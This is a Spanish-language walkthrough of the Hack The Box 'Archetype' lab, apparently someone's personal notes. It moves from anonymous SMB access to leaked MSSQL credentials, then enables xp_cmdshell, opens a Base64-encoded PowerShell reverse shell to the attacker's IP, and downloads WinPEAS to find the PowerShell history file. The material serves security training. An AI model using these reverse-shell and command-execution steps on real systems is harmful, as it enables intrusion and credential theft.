### Descripción de la máquina y qué significa cada parte

> _"SQL server mal configurado + SMB expuesto + sensitive data exposure → SMB sin autenticación con credenciales en texto plano → MSSQL vía Impacket → xp_cmdshell → reverse shell → WinPEAS → historial de PowerShell con contraseña de admin"_

Esta descripción es literalmente el mapa completo del pentest, en orden. Cada máquina de HTB Starting Point te da esto a propósito, para que sepas qué buscar en cada fase sin tener que adivinar el "tipo" de vulnerabilidad desde cero.

IP objetivo: `10.129.80.133`  
Tu IP VPN: `10.10.16.126`

---

### 1. Escaneo de puertos

bash

```bash
nmap -sC -sV -p- 10.129.80.133
```

**Qué hace cada parte de este comando:**

- `-sC`: ejecuta scripts básicos de detección de nmap (versión, vulnerabilidades conocidas, banners...)
- `-sV`: intenta detectar la versión exacta del software que corre en cada puerto abierto
- `-p-`: escanea **todos** los 65535 puertos posibles, no solo los ~1000 más comunes (por defecto nmap solo mira los típicos, y en máquinas Windows a veces hay servicios interesantes en puertos menos habituales)

**Resultado:**

```
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
5985/tcp open  http (en realidad WinRM)
```

**Explicación de cada servicio, a fondo:**

- **135 (MSRPC)**: Microsoft RPC (Remote Procedure Call). Es un mecanismo que usan los propios programas y servicios de Windows para "hablar entre ellos" a través de la red — por ejemplo, para gestionar servicios remotamente, o coordinar tareas entre distintos componentes del sistema operativo. Casi nunca se ataca este puerto de forma directa en máquinas fáciles, pero su presencia confirma que estamos ante un sistema Windows.
- **139 y 445 (SMB)**: SMB (Server Message Block) es el protocolo que usa Windows para compartir archivos, carpetas e impresoras a través de la red — el equivalente funcional a lo que hace NFS en Linux, o a montar una carpeta compartida en tu red doméstica. El puerto **445** es la versión moderna, que corre directamente sobre TCP/IP. El puerto **139** es la versión más antigua, que corre sobre NetBIOS (una tecnología de red más vieja). Windows suele tener ambos abiertos por compatibilidad. Este es el que más nos interesó al principio, porque la descripción decía explícitamente que había un share SMB accesible sin autenticación.
- **1433 (MSSQL)**: Microsoft SQL Server, el motor de base de datos propio de Microsoft (como PostgreSQL o MySQL, pero de la casa Microsoft, muy común en entornos empresariales que usan tecnología Windows). Puerto por defecto donde escucha el servicio.
- **5985 (WinRM)**: Windows Remote Management. Es un protocolo (basado en un estándar llamado WS-Management) que permite ejecutar comandos y gestionar un Windows de forma remota, similar en propósito a lo que hace SSH en Linux — de hecho, herramientas como PowerShell Remoting usan este puerto por debajo. Nmap lo identificó mal como "http" genérico porque WinRM técnicamente usa HTTP como transporte, pero es un servicio de gestión remota, no una web normal.

---

### 2. Enumeración de SMB sin autenticación

bash

```bash
smbclient -L //10.129.80.133/ -N
```

**Desglose del comando:**

- `smbclient`: herramienta cliente para interactuar con servidores SMB, muy parecida en su forma de uso a un cliente FTP clásico
- `-L`: modo "listar" — le pides al servidor que te enseñe qué recursos compartidos (shares) tiene disponibles, sin conectarte a ninguno en concreto todavía
- `//10.129.80.133/`: la dirección del servidor SMB al que preguntas
- `-N`: fuerza una conexión **null/anónima** — es decir, le dices "no voy a darte usuario ni contraseña, intenta dejarme entrar igualmente". Esto solo funciona si el servidor está mal configurado para permitir acceso anónimo (lo cual, según la descripción de la máquina, es exactamente el caso aquí)

**Resultado — 4 shares:**

```
ADMIN$    Disk    Remote Admin
backups   Disk
C$        Disk    Default share
IPC$      IPC     Remote IPC
```

**Por qué diferenciamos estos shares:**

Windows, de fábrica, crea automáticamente ciertos shares "administrativos" en cualquier instalación, identificables porque su nombre termina en `$` (el símbolo `$` al final hace que ese share no aparezca al navegar la red visualmente desde el Explorador de Windows, aunque sigue siendo accesible si sabes el nombre exacto):

- **`ADMIN$`**: apunta a la carpeta de instalación de Windows (`C:\Windows`), pensado para tareas de administración remota
- **`C$`**: apunta directamente a la raíz del disco `C:` completo
- **`IPC$`**: no es realmente un share de archivos — es un canal especial para comunicación entre procesos (Inter-Process Communication), usado internamente por Windows para ciertas operaciones de red

Todos estos tres, normalmente, **solo son accesibles con credenciales de administrador** — un usuario anónimo no debería poder entrar en ellos de verdad (aunque a veces se listan igual, solo para "presumir" que existen).

**`backups`**, en cambio, no sigue ese patrón de nomenclatura de Windows — no termina en `$`, no es un nombre reservado del sistema. Esto nos dice que **alguien, a propósito, creó este share manualmente** — probablemente un administrador que necesitaba compartir archivos de backup con otros sistemas o usuarios, y lo dejó mal configurado (accesible sin autenticación).

**Task de HTB**: _"What is the name of the non-Administrative share available over SMB?"_ → `backups`

---

### 3. Explorar el share `backups`

bash

```bash
smbclient //10.129.80.133/backups -N
```

(mismo concepto que antes, pero ahora conectándote directamente a ESE share concreto, en vez de solo listar cuáles existen)

Una vez dentro, la interfaz de `smbclient` funciona de forma muy parecida a un cliente FTP clásico — tienes un prompt tipo `smb: \>` donde puedes usar comandos como:

- `ls` → listar archivos en la carpeta actual
- `get nombre_archivo` → descargar ese archivo a tu máquina local (a la carpeta desde donde lanzaste smbclient)
- `cd carpeta` → cambiar de carpeta dentro del share
- `exit` → salir de la sesión

Encontramos un único archivo: `prod.dtsConfig`

```
get prod.dtsConfig
exit
```

**Qué es un archivo `.dtsConfig`, en detalle:**

SSIS (SQL Server Integration Services) es una herramienta de Microsoft, parte del ecosistema de SQL Server, pensada para automatizar procesos de **ETL** (Extract, Transform, Load) — es decir, mover datos desde un origen (por ejemplo, un archivo Excel, otra base de datos, un servicio web) hacia un destino (típicamente, una base de datos SQL Server), aplicando transformaciones en el camino si hace falta.

Estos procesos ("paquetes" de SSIS) necesitan saber **cómo conectarse** a sus orígenes y destinos de datos — y esa información de conexión (servidor, usuario, contraseña) a veces se guarda en archivos de configuración externos, precisamente para poder cambiarla sin tener que editar el paquete completo cada vez. Esos archivos de configuración son los `.dtsConfig` — y, como en tantos otros casos que ya has visto (Vaccine, Oopsie), cuando un desarrollador o administrador configura esto de forma descuidada, termina guardando las credenciales **en texto plano**, sin ningún tipo de cifrado, dentro de ese archivo.

---

### 4. Credenciales en texto plano

bash

```bash
cat prod.dtsConfig
```

Contenido relevante (es un archivo XML):

xml

```xml
<ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;...</ConfiguredValue>
```

Esta línea es literalmente una **cadena de conexión** (connection string) — un formato estándar que usan las aplicaciones para especificar, en una sola línea de texto, todos los datos necesarios para conectarse a una base de datos: dónde está el servidor (`Data Source`), con qué usuario (`User ID`), con qué contraseña (`Password`), y a qué base de datos concreta (`Initial Catalog`).

De ahí sacamos:

- Usuario: **`ARCHETYPE\sql_svc`**
- Contraseña: **`M3g4c0rp123`**

**Sobre el formato `ARCHETYPE\sql_svc`:**

En Windows, los usuarios se identifican con el formato `DOMINIO\usuario` (o `MÁQUINA\usuario`, si el sistema no pertenece a un dominio de Active Directory, sino que es una máquina "standalone" que gestiona sus propios usuarios locales). `ARCHETYPE` es el propio nombre de esta máquina (lo verificas comparándolo con el nombre que aparece en otros mensajes del sistema, o directamente porque coincide con el nombre de la máquina de HTB). `sql_svc` es el nombre del usuario en sí — y el sufijo `_svc` es una convención muy común para indicar que es una **cuenta de servicio** (service account): un usuario especial, no pensado para que una persona inicie sesión con él normalmente, sino para que un **servicio del sistema** (en este caso, SQL Server) se ejecute bajo esa identidad, con los permisos específicos que ese servicio necesita.

---

### 5. Conectarse a MSSQL con Impacket

**¿Qué es Impacket, en general?**

Impacket es una colección (suite) de herramientas y librerías en Python, desarrollada para interactuar con protocolos de red propios de Windows (SMB, MSRPC, Kerberos, y también MSSQL) de forma programática, sin depender de las herramientas nativas de Windows. Es una de las suites más usadas en pentesting contra entornos Windows/Active Directory — te la vas a encontrar muchísimo en máquinas de este estilo.

**`mssqlclient.py`** es, específicamente, el script de Impacket que actúa como **cliente de SQL Server**, permitiéndote conectarte y ejecutar consultas SQL desde tu terminal Linux, sin necesitar las herramientas oficiales de Microsoft (que normalmente solo existen para Windows).

bash

```bash
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.129.80.133 -windows-auth
```

**Desglose:**

- `ARCHETYPE/sql_svc@10.129.80.133`: especifica dominio/usuario, arroba, IP del servidor
- `-windows-auth`: SQL Server soporta dos formas de autenticación: la suya propia ("SQL Server Authentication", con usuarios creados directamente dentro de la base de datos) o la de Windows ("Windows Authentication", usando las cuentas del propio sistema operativo). Como `sql_svc` es una cuenta de Windows (no un usuario creado a mano dentro de SQL Server), necesitamos indicarle a la herramienta que use este segundo método de autenticación

Al conectar, obtienes una consola interactiva tipo:

```
SQL (ARCHETYPE\sql_svc  guest@master)>
```

`guest@master` indica que, en ese momento, tu sesión está usando la base de datos `master` (una base de datos del sistema que siempre existe en SQL Server) con privilegios de `guest` (invitado, muy limitados por defecto).

---

### 6. Habilitar `xp_cmdshell`

**Explicación a fondo de qué es un "stored procedure" en SQL Server:**

Más allá de las consultas SQL normales (`SELECT`, `INSERT`, `UPDATE`...), SQL Server permite definir **procedimientos almacenados** (stored procedures): bloques de código reutilizables, guardados dentro del propio servidor, que puedes invocar con `EXEC nombre_procedimiento parámetros`. Es parecido al concepto de "función" en programación, pero vive dentro de la base de datos.

Además de los procedimientos que tú mismo podrías crear, SQL Server trae de fábrica un conjunto de "procedimientos almacenados extendidos" (con el prefijo `xp_`), que son procedimientos especiales implementados en código nativo (no en SQL puro), capaces de hacer cosas que van más allá de la simple gestión de datos — como interactuar directamente con el sistema operativo.

**`xp_cmdshell`** es, específicamente, el procedimiento que actúa de puente hacia la consola de comandos de Windows (`cmd.exe`). Cuando lo ejecutas:

sql

```sql
EXEC xp_cmdshell 'comando_aqui';
```

SQL Server, internamente, abre una instancia de `cmd.exe`, ejecuta el comando que le pasaste, captura la salida de texto que ese comando genera, y te la devuelve como si fuera el resultado de una consulta SQL normal (una tabla con filas de texto).

Por lo peligroso que es esto (le da a cualquiera con acceso a la base de datos, la capacidad de ejecutar comandos arbitrarios en el sistema operativo completo), Microsoft lo trae **deshabilitado de fábrica** en cualquier instalación nueva de SQL Server.

**Primer intento (falla):**

sql

```sql
EXEC xp_cmdshell 'whoami';
```

```
ERROR: this component is turned off as part of the security configuration for this server
```

**`sp_configure`**, el procedimiento que controla la configuración general del servidor:

Este es otro procedimiento almacenado del sistema, cuyo propósito es permitir ver y modificar decenas de parámetros de configuración de SQL Server — desde cosas triviales hasta funciones muy sensibles como `xp_cmdshell`. Por defecto, `sp_configure` solo te deja ver/tocar las opciones consideradas "básicas" — para llegar a las opciones "avanzadas" (donde está `xp_cmdshell`), primero tienes que activar explícitamente esa visibilidad.

sql

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**Por qué el `RECONFIGURE` es necesario en cada paso**: cuando ejecutas `sp_configure 'opción', valor`, ese cambio queda registrado como "pendiente de aplicar", pero SQL Server no lo activa de inmediato por sí solo (es una medida de seguridad adicional, para evitar cambios accidentales instantáneos). El comando `RECONFIGURE` es el que efectivamente aplica esos cambios pendientes, haciéndolos efectivos.

**Verificación:**

sql

```sql
EXEC xp_cmdshell 'whoami';
-- archetype\sql_svc
```

✅ Ya funciona — has confirmado ejecución de comandos del sistema operativo.

**Por qué esto es un fallo de seguridad tan grave en esta máquina en concreto:** el problema de fondo no es que `xp_cmdshell` exista como funcionalidad (viene desactivado por precaución razonable de Microsoft) — el problema real es que la cuenta `sql_svc`, que es una **cuenta de servicio** (pensada solo para que el propio motor de SQL Server funcione internamente, sin necesitar privilegios administrativos amplios), tenga suficientes permisos **dentro** de SQL Server como para poder ejecutar `sp_configure` y activar esta función tan peligrosa por su propia cuenta. Un servidor bien configurado limitaría severamente lo que una cuenta de servicio puede hacer a nivel de configuración del propio motor de base de datos.

---

### 7. Reverse shell con PowerShell (vía `xp_cmdshell`)

**Por qué el enfoque cambia respecto a Linux:**

En las máquinas Linux anteriores (Vaccine, Oopsie), usábamos `nc` (netcat) tanto para escuchar en tu Parrot como, indirectamente, para que la máquina víctima se conectara (con el one-liner de bash + `mkfifo`, o el script PHP que abría sockets). Windows, de serie, no trae instalado `netcat` — así que necesitamos otra herramienta nativa de Windows capaz de abrir conexiones de red por sí misma.

**PowerShell** es la respuesta: es un intérprete de comandos y lenguaje de scripting mucho más potente que el `cmd.exe` clásico, construido sobre el framework .NET de Microsoft. Al estar integrado con .NET, PowerShell tiene acceso directo a **clases completas de programación** que normalmente usarías en un lenguaje como C# — incluida la clase `System.Net.Sockets.TCPClient`, que permite abrir una conexión de red TCP directamente desde el propio script, sin necesitar ningún programa auxiliar externo.

**Por qué no podemos simplemente pegar el script de PowerShell en la consola SQL:**

`mssqlclient.py` te da una consola que interpreta **exclusivamente sintaxis SQL**. Si escribes código PowerShell ahí directamente (como `$client = New-Object ...`), SQL Server intenta interpretarlo como si fuera una consulta SQL, y como esa sintaxis no tiene ningún sentido en SQL, lanza un error de sintaxis.

Para poder ejecutar código de PowerShell, tenemos que **envolverlo** dentro de una llamada a `xp_cmdshell` (que ya sabemos que ejecuta comandos de `cmd.exe`), pidiéndole a `cmd.exe` que a su vez invoque `powershell.exe`, pasándole el script como argumento:

sql

```sql
EXEC xp_cmdshell 'powershell -comando_aqui';
```

**El problema de las comillas anidadas, explicado con más detalle:**

El script de PowerShell que queremos ejecutar contiene, dentro de sí mismo, muchísimas comillas simples (`'10.10.16.126'`, `'PS '`, etc.). El problema es que nosotros necesitamos **envolver todo ese script** dentro de otra cadena de texto en SQL, que **también** se delimita con comillas simples (`EXEC xp_cmdshell 'AQUÍ_VA_EL_COMANDO'`). Cuando el intérprete de SQL ve la primera comilla simple dentro del script (por ejemplo, la de `'10.10.16.126'`), la interpreta como **el cierre** de la cadena SQL externa — rompiendo por completo la estructura del comando, mucho antes de llegar al final real del script.

**La solución: Base64**

Base64 es un sistema de codificación que transforma cualquier dato binario o texto en una representación usando solo un conjunto muy limitado y "seguro" de caracteres: las letras mayúsculas y minúsculas (A-Z, a-z), los números (0-9), y un par de símbolos adicionales (`+`, `/`, `=`). **Ninguno de estos caracteres incluye comillas**, así que al codificar nuestro script completo en Base64, obtenemos una única cadena larga de texto que puede pasar tranquilamente por dentro de otra cadena SQL delimitada por comillas, sin ningún conflicto.

PowerShell tiene un parámetro específico, **`-EncodedCommand`** (que se puede abreviar como `-e` o `-enc`), diseñado exactamente para este propósito: le pasas una cadena en Base64, y PowerShell internamente la decodifica de vuelta a texto normal, y ejecuta ese texto como si fuera un script de PowerShell normal.

**Detalle técnico importante sobre la codificación de caracteres:**

Cuando generas el Base64 para usar con `-EncodedCommand`, PowerShell espera específicamente que el texto original, antes de codificarlo, esté representado en una codificación de caracteres llamada **UTF-16LE** (Little Endian) — es la codificación de texto que PowerShell/.NET usa internamente por convención en Windows, distinta de la más común UTF-8 que usamos normalmente en Linux. Si generas el Base64 a partir de texto en UTF-8 en vez de UTF-16LE, PowerShell no será capaz de decodificarlo correctamente (dará errores raros, o simplemente no ejecutará nada coherente).

Por eso, el comando de generación en tu Parrot incluye ese paso intermedio de conversión:

bash

```bash
iconv -f UTF-8 -t UTF-16LE script.ps1 | base64 -w 0
```

- `iconv -f UTF-8 -t UTF-16LE`: convierte el archivo de texto (que escribiste en UTF-8 normal) a la codificación UTF-16LE que espera PowerShell
- `base64 -w 0`: codifica ese resultado en Base64, con `-w 0` indicando que no queremos que la salida se divida en líneas (queremos toda la cadena en una única línea continua, sin saltos)

**El script en sí, explicado por partes:**

powershell

```powershell
$client = New-Object System.Net.Sockets.TCPClient('IP',PUERTO)
```

Crea un objeto que representa una conexión TCP hacia tu IP y puerto.

powershell

```powershell
$stream = $client.GetStream()
```

Obtiene el "flujo" (stream) de datos de esa conexión — el canal por el que se va a leer y escribir información.

powershell

```powershell
[byte[]]$bytes = 0..65535|%{0}
```

Prepara un array (una especie de "buffer" o zona de memoria temporal) donde se irán guardando los datos que lleguen por la conexión.

powershell

```powershell
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){...}
```

Un bucle que se queda escuchando continuamente: cada vez que llega algún dato por la conexión (es decir, cada vez que tú escribes un comando en tu `nc`), lo lee.

powershell

```powershell
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
```

Convierte esos datos recibidos (que llegan como números/bytes) de vuelta a texto legible.

powershell

```powershell
$sendback = (iex $data 2>&1 | Out-String )
```

Aquí está el corazón del script: `iex` es el alias de **Invoke-Expression**, que le dice a PowerShell "toma este texto y ejecútalo como si fuera un comando real de PowerShell". Es decir, el texto que tú escribiste en tu `nc` (por ejemplo, `whoami`) se ejecuta de verdad en la máquina víctima, y el resultado se captura.

powershell

```powershell
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()
```

Convierte ese resultado de vuelta a bytes, y lo envía por la misma conexión de vuelta hacia ti — así ves la respuesta en tu `nc`.

En resumen: es un bucle infinito de "recibe texto → ejecútalo como comando → manda de vuelta el resultado", que es exactamente la definición funcional de una shell interactiva remota.

![[Pasted image 20260706135635.png]]

**Ejecución práctica:**

bash

```bash
nc -lvnp 4444
```

sql

```sql
EXEC xp_cmdshell 'powershell -e <BASE64_generado>';
```

**Resultado:**

```
archetype\sql_svc
PS C:\Windows\system32>
```

El prompt `PS C:\Windows\system32>` confirma que estás dentro de una sesión de **PowerShell** (no `cmd.exe` clásico), interactuando con el sistema de archivos de Windows con normalidad.

```bash
locate winPEAS
# /usr/share/peass/winpeas/winPEASx64.exe
```

Elegimos la versión `x64` porque la mayoría de sistemas Windows modernos (incluido este) son de arquitectura de 64 bits.

#### Cómo transferir el archivo a la máquina víctima

Aquí nos encontramos con un reto práctico: tenemos una reverse shell (control de comandos), pero no una forma directa de "subir archivos" como teníamos con el formulario de Oopsie. La solución típica es levantar un **servidor web temporal** en tu propia máquina, y hacer que la víctima **descargue** el archivo desde ahí, usando su propia capacidad de hacer peticiones HTTP.

bash

```bash
cd /usr/share/peass/winpeas/
python3 -m http.server 8000
```

`python3 -m http.server 8000` es un mini-servidor web instantáneo, incluido con Python, que sirve todos los archivos de la carpeta actual a través de HTTP en el puerto indicado (8000). Cualquiera que se conecte a `http://TU_IP:8000/` va a poder ver y descargar los archivos de esa carpeta, como si fuera una web normal.

powershell

```powershell
Invoke-WebRequest -Uri "http://10.10.16.126:8000/winPEASx64.exe" -OutFile "C:\Windows\Temp\winPEAS.exe"
```

`Invoke-WebRequest` es el equivalente en PowerShell a `curl` o `wget` en Linux — hace una petición HTTP y descarga el resultado. Se lo guarda en `C:\Windows\Temp\`, una carpeta temporal de Windows donde normalmente cualquier usuario tiene permiso de escritura.

#### Ejecutar y filtrar el resultado

powershell

```powershell
C:\Windows\Temp\winPEAS.exe > C:\Windows\Temp\resultado.txt
```

El símbolo `>` (igual que en Linux) redirige toda la salida que normalmente veríamos en pantalla hacia un archivo de texto, en vez de mostrarla directamente — útil porque el informe de WinPEAS es larguísimo.


![[Pasted image 20260706135339.png]]![[Pasted image 20260706135318.png]]

```
C:\Windows\Temp\resultado.txt:213:    PS history file: 
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

WinPEAS te ha confirmado exactamente lo que esperábamos: existe un archivo de **historial de PowerShell** del usuario `sql_svc`, en esa ruta.

Vamos a leer su contenido directamente:

powershell

```powershell
Get-Content C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

`Get-Content` es el equivalente en PowerShell a `cat` en Linux — muestra el contenido de un archivo de texto.

![[Pasted image 20260706135519.png]]![[Pasted image 20260706135744.png]]


Vamos a buscarlas de verdad:

powershell

```powershell
Get-ChildItem -Path C:\Users -Recurse -Filter "*.txt" -ErrorAction SilentlyContinue
```

**Qué hace este comando:**

- `Get-ChildItem`: equivalente en PowerShell a `ls`/`dir`, lista archivos y carpetas
- `-Path C:\Users`: busca dentro de la carpeta de usuarios (donde estarán los escritorios de `sql_svc` y `Administrator`)
- `-Recurse`: busca también dentro de todas las subcarpetas, no solo en el primer nivel
- `-Filter "*.txt"`: solo nos interesan archivos `.txt`
- `-ErrorAction SilentlyContinue`: evita que se llene la pantalla de errores por carpetas a las que no tengamos permiso de acceso (hay carpetas de sistema que ni el administrador puede listar sin más)



![[Pasted image 20260706135928.png]]
![[Pasted image 20260706140002.png]]

![[Pasted image 20260706140101.png]]